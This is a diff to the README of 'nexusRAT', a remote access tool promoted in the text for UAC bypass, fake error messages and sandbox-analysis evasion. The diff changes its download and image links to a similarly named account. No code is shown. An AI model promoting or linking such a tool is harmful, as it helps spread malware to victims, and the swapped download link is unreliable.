@@ -1,5 +1,5 @@
 # nexusRAT (remote admin tootls)
-[![Download](https://img.shields.io/badge/Download-Now-Green?style=for-the-badge&logo=appveyor)](https://github.com/hai1723/nexusRAT/archive/refs/heads/master.zip)
+[![Download](https://img.shields.io/badge/Download-Now-Green?style=for-the-badge&logo=appveyor)](https://github.com/hai723/nexusRAT/archive/refs/heads/master.zip)
 [![Tutorial video](https://img.shields.io/badge/Watch-Tutorial-blue?style=for-the-badge&logo=youtube)](https://streamable.com/g5pg9l)
 # .
 ### code by hai1723
@@ -17,11 +17,12 @@ uac bypass + eror fake
 anti sand box analysis
 
 ### scan:
-https://www.virustotal.com/gui/file-analysis/YTgyNDZjZmQwYzY1MmJhMTk3MWYzMGQ4MmZhM2FmNmI6MTY5OTM2MjQwNA==
-https://www.hybrid-analysis.com/sample/fc443c84e42aeac7f5bf38ac69075f01cff6db71aa832ff8303900bcef54a415
+<a href="https://www.virustotal.com/gui/file-analysis/YTgyNDZjZmQwYzY1MmJhMTk3MWYzMGQ4MmZhM2FmNmI6MTY5OTM2MjQwNA=="><img src="https://raw.githubusercontent.com/hai723/storage/main/virustotal.jpg" height="50%"></a>
+![Image Preview](https://raw.githubusercontent.com/hai723/storage/main/air.png)
+<a href="https://www.hybrid-analysis.com/sample/fc443c84e42aeac7f5bf38ac69075f01cff6db71aa832ff8303900bcef54a415"><img src="https://raw.githubusercontent.com/hai723/storage/main/hybrid-analysis.png" height="50%"></a>
 
 ## screenshot
-![Image Preview](https://raw.githubusercontent.com/hai1723/storage/main/virustotalnexusrat.png)
+![Image Preview](https://raw.githubusercontent.com/hai723/storage/main/virustotalnexusrat.png)
  
 [back](#)
 
